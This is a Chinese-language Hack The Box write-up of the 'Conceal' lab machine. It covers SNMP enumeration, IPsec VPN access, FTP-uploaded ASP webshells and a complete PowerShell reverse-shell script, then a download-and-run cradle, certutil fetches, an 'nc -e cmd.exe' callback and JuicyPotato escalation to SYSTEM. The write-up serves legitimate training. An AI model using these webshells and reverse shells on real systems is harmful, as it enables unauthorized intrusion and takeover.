<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QimShsQ6cxFLnb8G5s6OLg)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qrPyVeC1GiadcVoZuI4J2Ug4JnGT05SR3uXj2Oz50607WAe6DgTGSPEA/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
 https://app.hackthebox.com/machines/Conceal
```

靶场: HackTheBox.com

靶机名称: Conceal

难度: **困难**

提示信息:

```
 无
```

目标: user.txt 和 root.txt

实验环境
----

```
 攻击机:Kali 10.10.16.3
 
 靶机:10.10.10.116
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
 sudo masscan -p1-65535 -i tun0 10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qzpZlTiaz2jS4mA9WJibWsjnOdbLaopbWkKSbcA1dmFicA2K0fo2WCLFUw/640?wx_fmt=png)

```
 sudo nmap -sU -pU:1-3000 10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qGDcBdicGia4ZsUAZI4DHVb0Do0gWtSyI3oBicVUsa47kaMibOoTt1MHy2A/640?wx_fmt=png)

```
 sudo nmap -sU -pU:161,500 -sC -sV 10.10.10.116 -oN nmapUdp.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qgPcCpmCCIdgmXffRaIeCibEDIUcZBFvyvR8P8rYNmTsVyaDBDqhID8g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6q8dRyxOu5AEyibB4gzs9NNVG5HNDJ1ibE5DFHxpPnib7h1HWXIcT1nIWwA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qth1ClTcXgWmABaZEOqBE9OqgGQcsp6TpvnBF8LBR45ibWBHPRtzbmZQ/640?wx_fmt=png)

多次扫描 TCP 端口未发现有端口开放，扫描 UDP 端口发现开放 161(snmp)、500(IKE:Internet Key Exchange) 两个端口。扫描结果中 161 使用 snmp v1 协议服务名为 public 并发现大量主机信息，先来看看 161 端口。

漏洞利用 (Exploitation)
-------------------

```
 snmpwalk -v 1 -c public 10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qRTUpiaCgTb0Ag1kdQia0aFHaY8x7dOcFWGV1Ciad6uxp1CA83PdTvLibDg/640?wx_fmt=png)

发现 IKE VPN 的密码 hash 值 为`9C8B1A372B1878851BE2C097031B6E43`，找个 md5 破解网站尝试解密

```
 https://crackstation.net/
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qz8Gv1CjtlGxKJudtD2VBhpSUY7x2Tcyvup0O6QrdIvwLic63ljTEj7w/640?wx_fmt=png)

有了 PSK 密钥明文 Dudecake1! 可以尝试连接 IKE 的 VPN，但是只有 IKEv1 版本才能连接，先来检查 IKE 版本

```
 ike-scan -M 10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qMhZSSlJKScGcsozJzFEOtzvtBMgMSARBuegmuSd1icw029VpPlLvjZw/640?wx_fmt=png)

扫描结果中可以看到 IKE 的版本是 version 1，认证密钥为 PSK(预共享密钥) 已拿到明文，加密方式为 3DES，可以尝试连接。

1。修改 IPSEC 配置文件

`ipsec.secrets`

```
 sudo vim /etc/ipsec.secrets
 
 10.10.10.116 %any : PSK "Dudecake1!"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6quHjLEmoaPCJQfDvfA4DlDOmYrx4yo4HE9yliaFkd997icq0oS15aXOIw/640?wx_fmt=png)

`ipsec.conf`

```
 sudo vim /etc/ipsec.conf
 
 config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no
 
 conn conceal
    ike=3des-sha1-modp1024
    esp=3des-sha1
    type=transport
    authby=secret
    keyexchange=ikev1
    left=10.10.16.4
    right=10.10.10.116
    rightsubnet=10.10.10.116[tcp]
    auto=add
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qa2zuIXup2kR8TUJ3lIibGztP1fAicseBv0duN0YX1PiaGicgRb6YZGRpPw/640?wx_fmt=png)

2。安装 3des_cbc 插件包

```
 sudo apt-get install libstrongswan-standard-plugins libstrongswan-extra-plugins
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qDb8meW6eW6icQb5KhicPoDVLNBcYnUKbms6QnPTXrsHvvBJumGnNALmw/640?wx_fmt=png)

3。配置完成开始连接

```
 sudo ipsec restart
 sudo ipsec up conceal
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qUqYKbXmRxoFAf476kORgYMkp1SgJnbudVO07slJvImo2ib3C0J7JFwQ/640?wx_fmt=png)

显示连接成功，验证一下

```
 sudo ipsec status
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qKGZEF5VrmW2ibCbqqhUDuOpXicz8poxWxBk4B36E4UUMygxNz8Gzybrg/640?wx_fmt=png)

在 nmap 扫描 161 端口时发现主机存在 21、80、445 等端口在内部开放。再次扫描端口

```
 sudo nmap -sC -sV -sT -p 21,80,139,445 10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qru5ibhLiaFM0rHwsqAaibicMWaFMVibpnveC1MqdAzcHCuibmj5uMzCyLDnw/640?wx_fmt=png)

确认端口开放后先来看看 21 端口，21 端口下的 ftp 服务支持匿名登录，先来看看 21 端口。

```
 ftp 10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qZgb9AT1A14nBLMnIRnnB4diaDg0wGwOxMickAOibasIspEiajjfLj6nQibQ/640?wx_fmt=png)

ftp 里未发现任何文件，查看是否有写权限

```
 put notes.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qH92INd5l2lgjn3iaibqFPOKDnIaYy0JI5YXH1P0MnVWXSpB62YWkd36g/640?wx_fmt=png)

有写权限，但是没什么利用价值，再来看看 80 端口

```
 http://10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6q68jj3LfF7ahuVtPaicEMjEtjh3IyYoJabu7XIGBX6ezFdwLCb3IZ0ww/640?wx_fmt=png)

访问后出现 IIS 默认页面，做个目录扫描收集敏感信息

```
 dirsearch -u http://10.10.10.116
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qmKzefypxh8Hk5TCTmHVAGcd6dlN2jXXvvmKER8C5ibr89qExYAzu9KQ/640?wx_fmt=png)

发现 Upload 目录，但是没有上传功能页面，访问看看

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6q8oVEFf7SUNrRVjRj45S4OK07z4ibzSdUNpu1osHBpMLcgNpuib1d98VQ/640?wx_fmt=png)

目录有个提示文件，打开看看

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6q9SlxTKNKetwFKaib0p2PEFwx4TxyKIgiavQnXA85hqicxtLPMsNOteFqw/640?wx_fmt=png)

访问后发现是刚刚在 FTP 上传的文件，再次上传个 webshell 试试

msfvemon 生成 aspx 后门

```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx > shell.aspx
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qSPgnuURjbmF1epYiarIpMYdP1BTV1hUiaoBHkaHLjehSf8CQPuyWQXXg/640?wx_fmt=png)

msf 开启监听

```
 msfconsole -q
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 10.10.16.4
 set LPORT 4444
 run
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6q39UmHX32jyEwibeAlc6bVB76eVmdCFG7pYLwfUdibu7Bq48cfl0Xibt4w/640?wx_fmt=png)

FTP 上传 webshell 并在页面中访问触发反弹

```
 ftp 10.10.10.116
 put shell.aspx
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qYSLenN74edzUvb9Ctuibsj7XVdXtqE6mR04icHWn6qmpTLsY0FanJ7gQ/640?wx_fmt=png)

上传成功，查看 upload 目录

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6q8hdvL3qX21o31A7yy13gDVMjOeibVdKRCWwncvKOOJ39Zzr47GgA8icA/640?wx_fmt=png)

shell.aspx 存在，但是之前上传的 notes.txt 文件不见了，看来这个目录会定时清空，先来触发反弹

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qID2I44UAKnPD79ObZCJ0iaKQzvxHDicZecy8EefFfSTHax6CoTy3RbzA/640?wx_fmt=png)

访问失败，可能没有安装 asp.net，用 msfvenom 生成 asp 后门试试

```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f asp > shell.asp
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qbPRxlWsvTuibsZ8zVI9UPZcEuksdLCgDHZY8bQVVmfzUVr8ub1EmfOw/640?wx_fmt=png)

重新上传并访问触发

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qdFabZYpD1aMgD9pGHgTju9kGunkaPYu54xyXFM3bc1La8EfawHVmgg/640?wx_fmt=png)

页面可以访问但是无法反弹 shell，换个一句话木马试试

```
 echo '<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request("cmd")).stdout.readall%>' >cmd.asp
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qFstQMzG0RICicxBj4P6Hw1xeDfOEx4ADZNQ9OxsnswL6ib5tfCv9ANwQ/640?wx_fmt=png)

继续上传访问

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qBhBAZZb1Sn9u3WEfaOvZtS8g7Mc8EC35Q6PAk36iaDClzGZAhnReXZg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qMmK89EwFWgQ8Kbd1aBjDaM2LDYmmUy54t880ZKsSuF6D10qPvs7cVg/640?wx_fmt=png)

执行命令成功，上传个 powersehll 后门

rev.ps1（注意修改最后一行攻击机 IP）

```
 function Invoke-PowerShellTcp
 
 {
 

 
    [CmdletBinding(DefaultParameterSet)] Param(
 
 
 
        [Parameter(Position = 0, Mandatory = $true, ParameterSet)]
 
        [Parameter(Position = 0, Mandatory = $false, ParameterSet)]
 
        [String]
 
         $IPAddress,
 
 
 
        [Parameter(Position = 1, Mandatory = $true, ParameterSet)]
 
        [Parameter(Position = 1, Mandatory = $true, ParameterSet)]
 
        [Int]
 
         $Port,
 
 
 
        [Parameter(ParameterSet)]
 
        [Switch]
 
         $Reverse,
 
 
 
        [Parameter(ParameterSet)]
 
        [Switch]
 
         $Bind
 
 
 
    )
 
 
 
     
 
    try
 
    {
 
         #Connect back if the reverse switch is used.
 
         if ($Reverse)
 
        {
 
             $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
 
        }
 
 
 
         #Bind to the provided port if Bind switch is used.
 
         if ($Bind)
 
        {
 
             $listener = [System.Net.Sockets.TcpListener]$Port
 
             $listener.start()    
 
             $client = $listener.AcceptTcpClient()
 
        }
 
 
 
         $stream = $client.GetStream()
 
        [byte[]]$bytes = 0..65535|%{0}
 
 
 
         #Send back current username and computername
 
         $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
 
         $stream.Write($sendbytes,0,$sendbytes.Length)
 
 
 
         #Show an interactive PowerShell prompt
 
         $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
 
         $stream.Write($sendbytes,0,$sendbytes.Length)
 
 
 
         while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 
        {
 
             $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
 
             $data = $EncodedText.GetString($bytes,0, $i)
 
            try
 
            {
 
                 #Execute the command on the target.
 
                 $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
 
            }
 
            catch
 
            {
 
                Write-Warning "Something went wrong with execution of command on the target."
 
                Write-Error $_
 
            }
 
             $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
 
             $x = ($error[0] | Out-String)
 
             $error.clear()
 
             $sendback2 = $sendback2 + $x
 
 
 
             #Return the results
 
             $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
 
             $stream.Write($sendbyte,0,$sendbyte.Length)
 
             $stream.Flush()  
 
        }
 
         $client.Close()
 
         if ($listener)
 
        {
 
             $listener.Stop()
 
        }
 
    }
 
    catch
 
    {
 
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
 
        Write-Error $_
 
    }
 
 }
 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 4444
```

在 rev.ps1 目录下开启 HTTP 服务

```
 py3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qamEgf8GsMXchu5vAybhXITTF6mCYjW3YZib4b1z7xTjzqFTjBHYTPWA/640?wx_fmt=png)

攻击机用 nc 监听 4444 端口

```
 nc -lnvp 4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qic7syJeNAiaVW8NAF0M8w4IichSYlUcIbRrJFN0JMFlQno8jfPdMiaMpXA/640?wx_fmt=png)

通过 websehll 上传并执行

```
 http://10.10.10.116/upload/cmd.asp?cmd=powershell iex(New-Object Net.Webclient).downloadstring('http://10.10.16.4:8000/rev.ps1')
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qCfibMZS05GNUsVDxjBuHRolPTicbFdHh6CJ6fDezPAG26AI1XbZ2ntTA/640?wx_fmt=png)

反弹成功，来找找敏感信息

```
 cd c:\users
 tree /f
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qm956kSibp3t43MmluA7wHg2mnZNzVodeibDs2LfEzW3ibItubNqxSo1BA/640?wx_fmt=png)

在 Destitute 用户目录的桌面文件夹中发现 proof.txt，来看下内容

```
 type Destitute\desktop\proof.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qRm5Rz99PoWGhYL02iauVNFSqqeiaL0WASic3WdUthQnawrJgHqt51iaBUw/640?wx_fmt=png)

拿到用户 flag，继续收集信息

```
 systeminfo
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6quslS6tTm4ia6mISKqc84egbk5l71VvTaxlIOT1L5Bfhgu6rgfjdsjGA/640?wx_fmt=png)

发现该机器为 64 位 win10 15063 版本，继续

```
 whoami /priv
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qf5XW7uLLPmc0ZTyvAKoyG5YxsoUceFL1hEiannOZiaVFuiblRXCrAyNpg/640?wx_fmt=png)

发现 SeImpersonatePrivilege 权限，使用烂土豆提权

下载地址：

```
 https://github.com/ohpe/juicy-potato
```

下载后在 JuicyPotato.exe 目录下开启 HTTP 服务

```
 py3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qEqKamoagBLaMD7BWMwTETIjo57hNoDaoIjYvCeqoMORVx18OZea2dw/640?wx_fmt=png)

由于烂土豆不能直接提权，还需要上传个后门程序，由烂土豆执行后门从而拿到 SYSTEM 权限

靶机下载烂土豆和 nc

```
 cd \users\destitute
 mkdir temp
 cd temp
 certutil -urlcache -split -f http://10.10.16.4:8000/JuicyPotato.exe jp.exe
 certutil -urlcache -split -f http://10.10.16.4:8000/nc64.exe nc.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qTFff1mxYDUdWx3m1uGKy3uCJ1ayOHqZJKOBEmQc3KHCkU8E2DcY1WQ/640?wx_fmt=png)

攻击机监听 3333 端口

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qUGTiaQY3lIZVRZVtT30OGibRyqIicKwiaicdnXldibia4QyAVVXok1SJ63u4w/640?wx_fmt=png)

将反弹 shell 命令写入 shell.bat

```
 echo "C:\users\Destitute\temp\nc.exe -e cmd.exe 10.10.16.4 3333" > shell.bat
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qek8Q8jgwYYBQkynLj0XRZJSr1OWcb7sDvK1bY8055IWGczH2j8Lzqg/640?wx_fmt=png)

开始提权

```
 .\jp.exe -t * -l 1234 -p c:\users\destitute\temp\shell.bat -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qsxUV0h5CFunfgucKB2weBZyPEVnIMwuprib8o3H74nIkOax8SbnlA0Q/640?wx_fmt=png)

提权成功，拿到 SYSTEM 权限 ，来找下 flag

```
 cd c:\Users\Administrator
 tree /f
 type desktop\proof.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qPbZBC3wO0OvZM27mSQibCfy1AunQfvb5gLwYbZtq53Q6ribW62YUtsOg/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qVKASlh250zRHrjJ4CRtFsRSRXlA9O1coKanrDibkjGsBDTUWGe7f5zg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qppvpUvOv6bt8Uwh0IaMCQrWWSeS3PROU01egKoLlQYsYibIn8hO7dDw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUvy7iakjYpFibUMO9iaWwYvk6qXW0ibFVXPAczZYC0nyiaMukXictl9ddPL3ib2gpnMPukPJcDIiaFUWM8Vzw/640?wx_fmt=jpeg)